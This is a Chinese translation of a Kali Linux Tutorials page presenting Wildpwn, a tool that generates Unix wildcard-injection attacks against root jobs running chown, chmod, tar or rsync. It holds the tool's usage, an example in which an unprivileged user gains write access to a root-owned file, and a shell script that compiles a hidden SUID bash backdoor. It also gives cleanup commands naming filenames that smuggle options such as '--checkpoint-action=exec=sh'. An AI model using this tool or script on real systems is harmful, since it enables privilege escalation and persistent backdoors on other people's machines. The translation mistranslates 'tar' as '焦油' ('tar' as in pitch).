# wild pwn–用于 Unix 通配符攻击的工具

> 原文：<https://kalilinuxtutorials.com/wildpwn-unix-wildcard-attacks/>

**Wildpwn** 是一个 Python UNIX 通配符攻击工具，帮助你生成攻击。它被认为是一个相当古老的攻击媒介，但它仍然经常工作。

## **Wildpwn 用法**

事情是这样的:

```
usage: wildpwn.py [-h] [--file FILE] payload folder

Tool to generate unix wildcard attacks

positional arguments:
  payload      Payload to use: (combined | tar | rsync)
  folder       Where to write the payloads

optional arguments:
  -h, --help   show this help message and exit
  --file FILE  Path to file for taking ownership / change permissions. Use it
               with combined attack only.
```

## **有效载荷类型**

*   **组合:**使用 chown & chmod 文件引用技巧，在 4.1 和 4.2 节中描述，组合在一个有效载荷中。
*   **tar:** 使用 tar 任意命令执行技巧，如 4.3 节所述。
*   **rsync:** 使用 rsync 任意命令执行技巧，如 4.4 节所述。

**又读[SV Scanner——扫描器漏洞和大规模利用](https://kalilinuxtutorials.com/svscanner-vulnerability-massive-exploit/)**

## **例子**

```
$ ls -lh /tmp/very_secret_file
-rw-r--r-- 1 root root 2048 jun 28 21:37 /tmp/very_secret_file

$ ls -lh ./pwn_me/
drwxrwxrwx 2 root root 4,0K jun 28 21:38 .
[...]
-rw-rw-r-- 1 root root    1024 jun 28 21:38 secret_file_1
-rw-rw-r-- 1 root root    1024 jun 28 21:38 secret_file_2
[...]

$ python wildpwn.py --file /tmp/very_secret_file combined ./pwn_me/
[!] Selected payload: combined
[+] Done! Now wait for something like: chown uid:gid *  (or)  chmod [perms] * on ./pwn_me/. Good luck!

[...time passes / some cron gets executed...]

# chmod 000 * (for example)

[...back with the unprivileged user...]

$ ls -lha ./pwn_me/
[...]
-rwxrwxrwx 1 root root    1024 jun 28 21:38 secret_file_1
-rwxrwxrwx 1 root root    1024 jun 28 21:38 secret_file_2
[...]

$ ls -lha /tmp/very_secret_file
-rwxrwxrwx 1 root root 2048 jun 28 21:38 /tmp/very_secret_file
```

## 用于 tar/rsync 攻击的 Bash 脚本

```
#!/bin/sh

# get current user uid / gid
CURR_UID="$(id -u)"
CURR_GID="$(id -g)"

# save file
cat > .cachefile.c << EOF
#include <stdio.h>
int main()
{
setuid($CURR_UID);
setgid($CURR_GID);
execl("/bin/bash", "-bash", NULL);
return 0;
}
EOF

# make folder where the payload will be saved
mkdir .cache
chmod 755 .cache

# compile & give SUID
gcc -w .cachefile.c -o .cache/.cachefile
chmod 4755 .cache/.cachefile
```

#### **清理(焦油)**

```
# clean up
rm -rf ./'--checkpoint=1'
rm -rf ./'--checkpoint-action=exec=sh .webscript'
rm -rf .webscript
rm -rf .cachefile.c
```

#### **清理(rsync)**

```
# clean up
rm -rf ./'-e sh .syncscript'
rm -rf .syncscript
rm -rf .cachefile.c
```

[![](img/d861a9096555aeb1980fc054015933d7.png) ](https://github.com/localh0t/wildpwn/) **信用:莱昂·尤拉尼克**